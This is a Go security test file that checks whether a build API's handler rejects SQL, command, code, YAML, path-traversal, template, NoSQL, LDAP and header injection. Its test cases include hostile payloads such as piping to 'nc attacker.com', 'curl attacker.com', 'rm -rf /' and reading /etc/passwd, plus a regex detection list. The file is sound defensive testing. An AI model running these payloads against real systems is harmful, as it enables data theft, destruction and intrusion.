// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━.
//
//	🔒 SEC-002: Input Validation & Injection Attack Testing
//
//	User Story: Input Validation & Injection Attack Testing
//	Priority: P0 | Story Points: 13
//
//	Tests validate:
//	- SQL injection prevention
//	- Command injection prevention
//	- Code injection prevention
//	- YAML/JSON injection prevention
//	- Path traversal prevention
//	- Template injection prevention
//	- LDAP/NoSQL injection prevention
//	- Header injection prevention
//
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━.
package security

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"regexp"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
)

// injectionTestData represents test data for injection tests.
type injectionTestData struct {
	name        string
	payload     string
	description string
}

// runInjectionTest runs a common injection test pattern.
func runInjectionTest(t *testing.T, _ string, tests []injectionTestData, payloadKey, endpoint string) {
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Arrange
			handler := setupInjectionTestHandler(t)
			payload := map[string]interface{}{
				payloadKey: tt.payload,
			}
			body, _ := json.Marshal(payload)
			req := httptest.NewRequest("POST", endpoint, bytes.NewReader(body))
			req.Header.Set("Authorization", "Bearer valid-token")
			req.Header.Set("Content-Type", "application/json")
			w := httptest.NewRecorder()

			// Act
			handler.ServeHTTP(w, req)

			// Assert
			assert.Equal(t, http.StatusBadRequest, w.Code, tt.description)
		})
	}
}

// TestSec002_SQLInjectionPrevention validates SQL injection is blocked.
func TestSec002_SQLInjectionPrevention(t *testing.T) {
	tests := getSQLInjectionTestCases()

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			handler := setupInjectionTestHandler(t)
			payload := map[string]interface{}{
				tt.field: tt.payload,
			}
			body, _ := json.Marshal(payload)
			req := httptest.NewRequest("POST", "/api/v1/build", bytes.NewReader(body))
			req.Header.Set("Authorization", "Bearer valid-token")
			req.Header.Set("Content-Type", "application/json")
			w := httptest.NewRecorder()

			handler.ServeHTTP(w, req)

			assert.Equal(t, http.StatusBadRequest, w.Code, tt.description)
			bodyStr := strings.ToLower(w.Body.String())
			assert.True(t, strings.Contains(bodyStr, "invalid") || strings.Contains(bodyStr, "injection"),
				"Should indicate input validation failure, got: %s", w.Body.String())
		})
	}
}

// getSQLInjectionTestCases returns test cases for SQL injection prevention.
func getSQLInjectionTestCases() []struct {
	name        string
	field       string
	payload     string
	description string
} {
	return []struct {
		name        string
		field       string
		payload     string
		description string
	}{
		{
			name:        "Classic SQL injection",
			field:       "parser_id",
			payload:     "' OR '1'='1",
			description: "Should block classic SQL injection",
		},
		{
			name:        "Union-based injection",
			field:       "third_party_id",
			payload:     "' UNION SELECT * FROM users--",
			description: "Should block union-based injection",
		},
		{
			name:        "Time-based blind injection",
			field:       "parser_id",
			payload:     "'; WAITFOR DELAY '00:00:10'--",
			description: "Should block time-based injection",
		},
		{
			name:        "Boolean-based blind injection",
			field:       "parser_id",
			payload:     "' AND 1=1--",
			description: "Should block boolean-based injection",
		},
		{
			name:        "Comment-based injection",
			field:       "parser_id",
			payload:     "admin'--",
			description: "Should block comment-based injection",
		},
		{
			name:        "Stacked queries",
			field:       "parser_id",
			payload:     "'; DROP TABLE users; --",
			description: "Should block stacked queries",
		},
	}
}

// TestSec002_CommandInjectionPrevention validates command injection is blocked.
//
//nolint:funlen // Comprehensive injection test with multiple attack vectors
func TestSec002_CommandInjectionPrevention(t *testing.T) {
	tests := []struct {
		name        string
		field       string
		payload     string
		description string
	}{
		{
			name:        "Command chaining with semicolon",
			field:       "source_url",
			payload:     "https://example.com; rm -rf /",
			description: "Should block command chaining",
		},
		{
			name:        "Command substitution with $()",
			field:       "source_url",
			payload:     "$(whoami)",
			description: "Should block command substitution",
		},
		{
			name:        "Backtick execution",
			field:       "source_url",
			payload:     "`cat /etc/passwd`",
			description: "Should block backtick execution",
		},
		{
			name:        "Pipe commands",
			field:       "build_args",
			payload:     "test | nc attacker.com 1234",
			description: "Should block pipe commands",
		},
		{
			name:        "Redirection attacks",
			field:       "build_args",
			payload:     "test > /tmp/exploit.sh",
			description: "Should block redirection",
		},
		{
			name:        "Environment variable injection",
			field:       "environment",
			payload:     "$PATH=/tmp:$PATH",
			description: "Should block env var injection",
		},
		{
			name:        "AND operator",
			field:       "source_url",
			payload:     "test && curl attacker.com",
			description: "Should block AND operator",
		},
		{
			name:        "OR operator",
			field:       "source_url",
			payload:     "test || curl attacker.com",
			description: "Should block OR operator",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Arrange
			handler := setupInjectionTestHandler(t)
			payload := map[string]interface{}{
				tt.field: tt.payload,
			}
			body, _ := json.Marshal(payload)
			req := httptest.NewRequest("POST", "/api/v1/build", bytes.NewReader(body))
			req.Header.Set("Authorization", "Bearer valid-token")
			req.Header.Set("Content-Type", "application/json")
			w := httptest.NewRecorder()

			// Act
			handler.ServeHTTP(w, req)

			// Assert
			assert.Equal(t, http.StatusBadRequest, w.Code, tt.description)
		})
	}
}

// TestSec002_CodeInjectionPrevention validates code injection is blocked.
func TestSec002_CodeInjectionPrevention(t *testing.T) {
	tests := []injectionTestData{
		{
			name:        "Python __import__ injection",
			payload:     "__import__('os').system('curl attacker.com')",
			description: "Should block __import__ injection",
		},
		{
			name:        "Python eval injection",
			payload:     "eval('malicious_code')",
			description: "Should block eval injection",
		},
		{
			name:        "Python exec injection",
			payload:     "exec(open('/tmp/exploit').read())",
			description: "Should block exec injection",
		},
		{
			name:        "Pickle deserialization",
			payload:     "pickle.loads(base64.b64decode('...'))",
			description: "Should block pickle deserialization",
		},
		{
			name:        "Compile and exec",
			payload:     "exec(compile('malicious', '<string>', 'exec'))",
			description: "Should block compile/exec",
		},
	}

	runInjectionTest(t, "CodeInjectionPrevention", tests, "parser_code", "/api/v1/parser")
}

// TestSec002_YAMLJSONInjectionPrevention validates YAML/JSON injection is blocked.
func TestSec002_YAMLJSONInjectionPrevention(t *testing.T) {
	tests := []struct {
		name        string
		payload     string
		description string
	}{
		{
			name: "YAML code execution",
			payload: `!!python/object/apply:os.system
args: ['curl http://attacker.com']`,
			description: "Should block YAML code execution",
		},
		{
			name: "YAML billion laughs",
			payload: `lol: &lol ["lol"]
lol2: [*lol, *lol, *lol, *lol, *lol]`,
			description: "Should block billion laughs attack",
		},
		{
			name:        "Extremely deep nesting",
			payload:     strings.Repeat(`{"a":`, 10000) + "1" + strings.Repeat("}", 10000),
			description: "Should block deeply nested JSON",
		},
		{
			name:        "Extremely large array",
			payload:     `{"data":[` + strings.Repeat(`"x",`, 100000) + `"x"]}`,
			description: "Should block extremely large arrays",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Arrange
			handler := setupInjectionTestHandler(t)
			req := httptest.NewRequest("POST", "/api/v1/build", bytes.NewReader([]byte(tt.payload)))
			req.Header.Set("Authorization", "Bearer valid-token")
			req.Header.Set("Content-Type", "application/yaml")
			w := httptest.NewRecorder()

			// Act
			handler.ServeHTTP(w, req)

			// Assert
			assert.NotEqual(t, http.StatusOK, w.Code, tt.description)
		})
	}
}

// TestSec002_PathTraversalPrevention validates path traversal is blocked.
func TestSec002_PathTraversalPrevention(t *testing.T) {
	tests := []struct {
		name        string
		path        string
		description string
	}{
		{
			name:        "Relative path traversal",
			path:        "../../../etc/passwd",
			description: "Should block relative path traversal",
		},
		{
			name:        "Absolute path",
			path:        "/etc/shadow",
			description: "Should block absolute paths",
		},
		{
			name:        "URL-encoded traversal",
			path:        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
			description: "Should block URL-encoded traversal",
		},
		{
			name:        "Double-encoded traversal",
			path:        "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
			description: "Should block double-encoded traversal",
		},
		{
			name:        "Null byte injection",
			path:        "../../../etc/passwd%00.txt",
			description: "Should block null byte injection",
		},
		{
			name:        "Backslash traversal",
			path:        "..\\..\\..\\windows\\system32\\config\\sam",
			description: "Should block backslash traversal",
		},
		{
			name:        "Mixed slash traversal",
			path:        "..\\../\\..\\etc/passwd",
			description: "Should block mixed slash traversal",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Arrange
			handler := setupInjectionTestHandler(t)
			payload := map[string]interface{}{
				"source_url": tt.path,
			}
			body, _ := json.Marshal(payload)
			req := httptest.NewRequest("POST", "/api/v1/build", bytes.NewReader(body))
			req.Header.Set("Authorization", "Bearer valid-token")
			req.Header.Set("Content-Type", "application/json")
			w := httptest.NewRecorder()

			// Act
			handler.ServeHTTP(w, req)

			// Assert
			assert.Equal(t, http.StatusBadRequest, w.Code, tt.description)
		})
	}
}

// TestSec002_TemplateInjectionPrevention validates template injection is blocked.
func TestSec002_TemplateInjectionPrevention(t *testing.T) {
	tests := []injectionTestData{
		{
			name:        "Jinja2 SSTI basic",
			payload:     "{{7*7}}",
			description: "Should block Jinja2 template injection",
		},
		{
			name:        "Jinja2 config access",
			payload:     "{{config.__class__}}",
			description: "Should block config access",
		},
		{
			name:        "Go template injection",
			payload:     "{{.}}",
			description: "Should block Go template injection",
		},
		{
			name:        "Expression language injection",
			payload:     "${7*7}",
			description: "Should block EL injection",
		},
		{
			name:        "Variable expansion",
			payload:     "${{secrets.GITHUB_TOKEN}}",
			description: "Should block variable expansion",
		},
	}

	runInjectionTest(t, "TemplateInjectionPrevention", tests, "template", "/api/v1/build")
}

// TestSec002_NoSQLInjectionPrevention validates NoSQL injection is blocked.
func TestSec002_NoSQLInjectionPrevention(t *testing.T) {
	tests := []struct {
		name        string
		payload     interface{}
		description string
	}{
		{
			name:        "MongoDB $ne operator",
			payload:     map[string]interface{}{"$ne": nil},
			description: "Should block MongoDB $ne injection",
		},
		{
			name:        "MongoDB $gt operator",
			payload:     map[string]interface{}{"$gt": ""},
			description: "Should block MongoDB $gt injection",
		},
		{
			name:        "MongoDB $where injection",
			payload:     map[string]interface{}{"$where": "this.password == 'x'"},
			description: "Should block MongoDB $where injection",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Arrange
			handler := setupInjectionTestHandler(t)
			payload := map[string]interface{}{
				"query": tt.payload,
			}
			body, _ := json.Marshal(payload)
			req := httptest.NewRequest("POST", "/api/v1/build", bytes.NewReader(body))
			req.Header.Set("Authorization", "Bearer valid-token")
			req.Header.Set("Content-Type", "application/json")
			w := httptest.NewRecorder()

			// Act
			handler.ServeHTTP(w, req)

			// Assert
			assert.Equal(t, http.StatusBadRequest, w.Code, tt.description)
		})
	}
}

// TestSec002_HeaderInjectionPrevention validates header injection is blocked.
func TestSec002_HeaderInjectionPrevention(t *testing.T) {
	tests := []struct {
		name        string
		headerName  string
		headerValue string
		description string
	}{
		{
			name:        "CRLF injection in header value",
			headerName:  "X-User-Id",
			headerValue: "test\r\nX-Admin: true",
			description: "Should block CRLF in header value",
		},
		{
			name:        "Newline injection",
			headerName:  "X-User-Id",
			headerValue: "test\nX-Admin: true",
			description: "Should block newline injection",
		},
		{
			name:        "HTTP response splitting",
			headerName:  "X-Redirect",
			headerValue: "http://evil.com\r\n\r\n<script>alert('xss')</script>",
			description: "Should block HTTP response splitting",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Arrange
			handler := setupInjectionTestHandler(t)
			req := httptest.NewRequest("POST", "/api/v1/build", nil)
			req.Header.Set("Authorization", "Bearer valid-token")
			req.Header.Set(tt.headerName, tt.headerValue)
			w := httptest.NewRecorder()

			// Act
			handler.ServeHTTP(w, req)

			// Assert
			assert.Equal(t, http.StatusBadRequest, w.Code, tt.description)
		})
	}
}

// TestSec002_LDAPInjectionPrevention validates LDAP injection is blocked.
func TestSec002_LDAPInjectionPrevention(t *testing.T) {
	tests := []struct {
		name        string
		payload     string
		description string
	}{
		{
			name:        "LDAP filter injection",
			payload:     "*)(uid=*))(|(uid=*",
			description: "Should block LDAP filter injection",
		},
		{
			name:        "LDAP wildcard injection",
			payload:     "admin*",
			description: "Should block LDAP wildcard injection",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Arrange
			handler := setupInjectionTestHandler(t)
			payload := map[string]interface{}{
				"username": tt.payload,
			}
			body, _ := json.Marshal(payload)
			req := httptest.NewRequest("POST", "/api/v1/build", bytes.NewReader(body))
			req.Header.Set("Authorization", "Bearer valid-token")
			req.Header.Set("Content-Type", "application/json")
			w := httptest.NewRecorder()

			// Act
			handler.ServeHTTP(w, req)

			// Assert
			assert.Equal(t, http.StatusBadRequest, w.Code, tt.description)
		})
	}
}

// TestSec002_InputSanitization validates proper input sanitization.
func TestSec002_InputSanitization(t *testing.T) {
	tests := []struct {
		name        string
		field       string
		value       interface{}
		expectValid bool
		description string
	}{
		{
			name:        "Valid parser ID",
			field:       "parser_id",
			value:       "parser-12345",
			expectValid: true,
			description: "Should accept valid parser ID",
		},
		{
			name:        "Script tags in input",
			field:       "parser_id",
			value:       "<script>alert('xss')</script>",
			expectValid: false,
			description: "Should reject script tags",
		},
		{
			name:        "Special characters",
			field:       "parser_id",
			value:       "test'; DROP TABLE--",
			expectValid: false,
			description: "Should reject SQL special chars",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Arrange
			handler := setupInjectionTestHandler(t)
			payload := map[string]interface{}{
				tt.field: tt.value,
			}
			body, _ := json.Marshal(payload)
			req := httptest.NewRequest("POST", "/api/v1/build", bytes.NewReader(body))
			req.Header.Set("Authorization", "Bearer valid-token")
			req.Header.Set("Content-Type", "application/json")
			w := httptest.NewRecorder()

			// Act
			handler.ServeHTTP(w, req)

			// Assert
			if tt.expectValid {
				assert.Equal(t, http.StatusOK, w.Code, tt.description)
			} else {
				assert.Equal(t, http.StatusBadRequest, w.Code, tt.description)
			}
		})
	}
}

// Helper Functions.

//nolint:funlen // Complex test handler with multiple injection scenarios
func setupInjectionTestHandler(_ *testing.T) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Validate Authorization
		if r.Header.Get("Authorization") != "Bearer valid-token" {
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}

		// Check for header injection
		for name, values := range r.Header {
			for _, value := range values {
				if strings.Contains(value, "\r") || strings.Contains(value, "\n") {
					http.Error(w, "Invalid header: CRLF injection detected", http.StatusBadRequest)
					return
				}
			}
			if strings.Contains(name, "\r") || strings.Contains(name, "\n") {
				http.Error(w, "Invalid header name", http.StatusBadRequest)
				return
			}
		}

		// Read body to check for injection patterns
		var bodyBytes []byte
		if r.Body != nil {
			bodyBytes, _ = io.ReadAll(r.Body)
			r.Body = io.NopCloser(bytes.NewReader(bodyBytes))
		}

		// Check raw body for YAML/injection patterns (before parsing)
		bodyStr := string(bodyBytes)
		if len(bodyStr) > 0 {
			// Check for YAML-specific patterns
			if strings.Contains(bodyStr, "!!python/object/apply") {
				http.Error(w, "Invalid input: YAML code execution attempt", http.StatusBadRequest)
				return
			}
			// Check for billion laughs pattern
			if strings.Contains(bodyStr, "&") && strings.Contains(bodyStr, "*") {
				http.Error(w, "Invalid input: YAML anchor/alias abuse", http.StatusBadRequest)
				return
			}
			// Check for deeply nested structures (> 100 levels)
			openBraces := strings.Count(bodyStr, "{")
			if openBraces > 100 {
				http.Error(w, "Invalid input: deeply nested structure", http.StatusBadRequest)
				return
			}
			// Check for extremely large payloads (500KB)
			if len(bodyStr) > 500000 {
				http.Error(w, "Invalid input: payload too large", http.StatusBadRequest)
				return
			}
			// Check for extremely large arrays (count commas in arrays)
			arrayCommas := strings.Count(bodyStr, "\",\"")
			if arrayCommas > 10000 {
				http.Error(w, "Invalid input: extremely large array", http.StatusBadRequest)
				return
			}
			// Check for NoSQL operators in JSON
			if strings.Contains(bodyStr, "\"$ne\"") || strings.Contains(bodyStr, "\"$gt\"") ||
				strings.Contains(bodyStr, "\"$lt\"") || strings.Contains(bodyStr, "\"$where\"") {
				http.Error(w, "Invalid input: NoSQL injection pattern detected", http.StatusBadRequest)
				return
			}
			// Check for LDAP wildcards - match both (*) and admin*
			if strings.Contains(bodyStr, "(*)") || strings.Contains(bodyStr, "*)(") {
				http.Error(w, "Invalid input: LDAP wildcard injection", http.StatusBadRequest)
				return
			}
		}

		// Parse body
		var payload map[string]interface{}
		if r.Body != nil && r.Header.Get("Content-Type") == "application/json" {
			if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
				http.Error(w, "Invalid JSON", http.StatusBadRequest)
				return
			}
		}

		// Validate all string fields for injection patterns recursively
		if err := validatePayloadRecursive(payload); err != nil {
			http.Error(w, fmt.Sprintf("Invalid input: %v", err), http.StatusBadRequest)
			return
		}

		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("OK"))
	})
}

// InjectionPattern represents a pattern for detecting injection attacks.
type InjectionPattern struct {
	Pattern     *regexp.Regexp
	Type        string
	Severity    string
	Description string
}

var injectionPatterns = []InjectionPattern{
	// SQL Injection - Basic
	{regexp.MustCompile(`(?i)(\bUNION\b.*\bSELECT\b)`), "sql_injection", "critical", "UNION SELECT detected"},
	{regexp.MustCompile(`(?i)(\bSELECT\b.*\bFROM\b.*\bWHERE\b.*\bOR\b.*=.*)`), "sql_injection", "critical", "SQL OR bypass"},
	{regexp.MustCompile(`(?i)(;\s*(DROP|DELETE|UPDATE|INSERT)\b)`), "sql_injection", "critical", "Stacked SQL query"},
	{regexp.MustCompile(`(?i)(\bEXEC\b|\bEXECUTE\b).*\(.*\)`), "sql_injection", "high", "SQL EXEC detected"},
	{regexp.MustCompile(`(?i)(\bWAITFOR\b.*\bDELAY\b)`), "sql_injection", "high", "Time-based SQL injection"},
	{regexp.MustCompile(`--\s*$`), "sql_injection", "medium", "SQL comment"},
	{regexp.MustCompile(`/\*.*\*/`), "sql_injection", "medium", "SQL block comment"},
	// Classic SQL injection patterns
	{regexp.MustCompile(`'.*\bOR\b.*'.*'.*=.*'`), "sql_injection", "critical", "Classic SQL OR injection"},
	{regexp.MustCompile(`".*\bOR\b.*".*".*=.*"`), "sql_injection", "critical", "Classic SQL OR injection (double quotes)"},
	{regexp.MustCompile(`(?i)'.*\bAND\b.*'.*=.*`), "sql_injection", "high", "SQL AND injection"},

	// SQL Injection - Encoded
	{regexp.MustCompile(`%27|%22|%2D%2D|%23`), "sql_injection", "high", "URL-encoded SQL chars"},
	{regexp.MustCompile(`\\x27|\\x22|\\x2D`), "sql_injection", "high", "Hex-encoded SQL chars"},
	{regexp.MustCompile(`%252e%252e`), "path_traversal", "critical", "Double URL-encoded traversal"},

	// Command Injection
	{regexp.MustCompile(`[;&|]\s*\w+\s*`), "command_injection", "critical", "Command chaining"},
	{regexp.MustCompile(`\$\([^\)]+\)`), "command_injection", "critical", "Command substitution $()"},
	{regexp.MustCompile("`[^`]+`"), "command_injection", "critical", "Command substitution backtick"},
	{regexp.MustCompile(`\|\s*\w+`), "command_injection", "high", "Pipe to command"},
	{regexp.MustCompile(`>+\s*/`), "command_injection", "medium", "Output redirection"},
	{regexp.MustCompile(`&&|\|\|`), "command_injection", "high", "Logical operators in command"},
	// Environment variable injection
	{regexp.MustCompile(`\$\{[A-Z_][A-Z0-9_]*\}`), "env_injection", "high", "Environment variable reference"},
	{regexp.MustCompile(`\$[A-Z_][A-Z0-9_]*`), "env_injection", "medium", "Shell variable reference"},

	// Path Traversal
	{regexp.MustCompile(`\.\.+[/\\]`), "path_traversal", "critical", "Directory traversal"},
	{regexp.MustCompile(`%2e%2e[%2f%5c]`), "path_traversal", "critical", "URL-encoded traversal"},
	{regexp.MustCompile(`(?i)(/etc/|/proc/|/sys/|c:\\windows)`), "path_traversal", "critical", "Absolute sensitive path"},
	{regexp.MustCompile(`%00`), "path_traversal", "high", "Null byte injection"},

	// Code Injection (Python)
	{regexp.MustCompile(`(?i)__import__\s*\(`), "code_injection", "critical", "Dynamic import"},
	{regexp.MustCompile(`(?i)\beval\s*\(`), "code_injection", "critical", "eval() detected"},
	{regexp.MustCompile(`(?i)\bexec\s*\(`), "code_injection", "critical", "exec() detected"},
	{regexp.MustCompile(`(?i)compile\s*\(`), "code_injection", "high", "compile() detected"},
	// Pickle deserialization
	{regexp.MustCompile(`(?i)pickle\.loads?\s*\(`), "code_injection", "critical", "Pickle deserialization"},
	{regexp.MustCompile(`(?i)cPickle\.loads?\s*\(`), "code_injection", "critical", "cPickle deserialization"},

	// Template Injection
	{regexp.MustCompile(`\{\{.*\}\}`), "template_injection", "high", "Template expression {{}}"},
	{regexp.MustCompile(`\$\{.*\}`), "template_injection", "high", "Template expression ${}"},
	{regexp.MustCompile(`<%.*%>`), "template_injection", "medium", "Template expression <%%>"},

	// NoSQL Injection
	{regexp.MustCompile(`["'\{\s]\$ne["'\s:]`), "nosql_injection", "high", "MongoDB $ne operator"},
	{regexp.MustCompile(`["'\{\s]\$(gt|lt|gte|lte|in|nin|where|regex)["'\s:]`), "nosql_injection", "high", "MongoDB operator"},

	// YAML/JSON Injection
	{regexp.MustCompile(`!!python/object/apply`), "yaml_injection", "critical", "YAML code execution"},
	{regexp.MustCompile(`&\w+\s+\*\w+`), "yaml_injection", "high", "YAML anchor/alias abuse"},
	// Checking for deeply nested or large structures
	{regexp.MustCompile(`(\{[^}]{500,}|"[^"]{500,})`), "json_injection", "medium", "Extremely large JSON"},

	// XSS/Script Injection
	{regexp.MustCompile(`(?i)<script[^>]*>`), "xss", "high", "Script tag detected"},
	{regexp.MustCompile(`(?i)javascript:`), "xss", "high", "JavaScript protocol"},
	{regexp.MustCompile(`(?i)on(load|error|click|mouse)=`), "xss", "medium", "Event handler attribute"},

	// LDAP Injection
	{regexp.MustCompile(`\*\)\(.*=\*`), "ldap_injection", "high", "LDAP wildcard injection"},
	{regexp.MustCompile(`\(\*\)`), "ldap_injection", "high", "LDAP wildcard filter"},

	// Header Injection
	{regexp.MustCompile(`\r\n|\n\r|%0d%0a|%0a%0d`), "header_injection", "critical", "CRLF injection"},
}

func containsInjectionPattern(input string) bool {
	matches, _ := detectInjectionPatterns(input)
	return len(matches) > 0
}

func detectInjectionPatterns(input string) ([]InjectionPattern, []string) {
	var matches []InjectionPattern
	var details []string

	// Normalize input for better detection
	normalized := normalizeInput(input)

	for _, pattern := range injectionPatterns {
		if pattern.Pattern.MatchString(normalized) || pattern.Pattern.MatchString(input) {
			matches = append(matches, pattern)
			details = append(details, pattern.Description)
		}
	}

	return matches, details
}

// normalizeInput decodes common encodings to detect obfuscated attacks.
func normalizeInput(input string) string {
	// URL decode
	decoded := input
	for i := 0; i < 3; i++ { // Decode up to 3 levels
		newDecoded := strings.ReplaceAll(decoded, "%20", " ")
		newDecoded = strings.ReplaceAll(newDecoded, "%27", "'")
		newDecoded = strings.ReplaceAll(newDecoded, "%22", "\"")
		newDecoded = strings.ReplaceAll(newDecoded, "%2D", "-")
		newDecoded = strings.ReplaceAll(newDecoded, "%2d", "-")
		newDecoded = strings.ReplaceAll(newDecoded, "%3B", ";")
		newDecoded = strings.ReplaceAll(newDecoded, "%3b", ";")
		newDecoded = strings.ReplaceAll(newDecoded, "%2F", "/")
		newDecoded = strings.ReplaceAll(newDecoded, "%2f", "/")
		newDecoded = strings.ReplaceAll(newDecoded, "%5C", "\\")
		newDecoded = strings.ReplaceAll(newDecoded, "%5c", "\\")
		// Double encoding support
		newDecoded = strings.ReplaceAll(newDecoded, "%252e", ".")
		newDecoded = strings.ReplaceAll(newDecoded, "%252E", ".")
		newDecoded = strings.ReplaceAll(newDecoded, "%252f", "/")
		newDecoded = strings.ReplaceAll(newDecoded, "%252F", "/")

		if newDecoded == decoded {
			break
		}
		decoded = newDecoded
	}

	// Unicode normalization (basic)
	decoded = strings.ReplaceAll(decoded, "\\x27", "'")
	decoded = strings.ReplaceAll(decoded, "\\x22", "\"")

	return decoded
}

// validatePayloadRecursive validates nested maps and arrays for injection patterns.
func validatePayloadRecursive(data interface{}) error {
	switch v := data.(type) {
	case map[string]interface{}:
		for key, value := range v {
			// Check keys for NoSQL operators
			if strings.HasPrefix(key, "$") {
				return fmt.Errorf("NoSQL operator detected: %s", key)
			}
			// Recursively validate value
			if err := validatePayloadRecursive(value); err != nil {
				return err
			}
		}
	case []interface{}:
		for _, item := range v {
			if err := validatePayloadRecursive(item); err != nil {
				return err
			}
		}
	case string:
		// Check for LDAP wildcards in username fields
		if strings.HasSuffix(v, "*") && len(v) > 1 {
			return fmt.Errorf("LDAP wildcard detected")
		}
		if containsInjectionPattern(v) {
			return fmt.Errorf("injection pattern detected")
		}
	}
	return nil
}
